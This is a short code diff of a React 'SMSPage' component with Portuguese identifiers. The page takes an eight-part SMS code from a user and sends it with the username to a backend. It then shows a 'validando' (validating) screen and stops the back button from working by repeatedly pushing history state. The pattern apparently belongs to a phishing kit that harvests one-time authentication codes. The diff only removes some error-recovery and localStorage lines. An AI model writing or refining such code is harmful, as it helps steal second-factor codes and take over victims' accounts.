@@ -29,13 +29,6 @@ const SMSPage = () => {
   });
 
   useEffect(() => {
-    const erroSalvo = localStorage.getItem("erroChave");
-    if (erroSalvo) {
-      setErro(erroSalvo);
-      setEnviando(false);
-      setChave(["", "", "", "", "", "", "", ""]);
-      localStorage.removeItem("erroChave");
-    }
     window.history.pushState(null, "", window.location.href);
     const handlePop = () => window.history.pushState(null, "", window.location.href);
     window.addEventListener("popstate", handlePop);
@@ -66,7 +59,6 @@ const SMSPage = () => {
     setErro("");
     setEnviando(true);
     send({ acao: "token", usuario, token: chave.join("") });
-    localStorage.setItem("paginaOrigem", "/sms");
     navigate("/validando");
   };
 
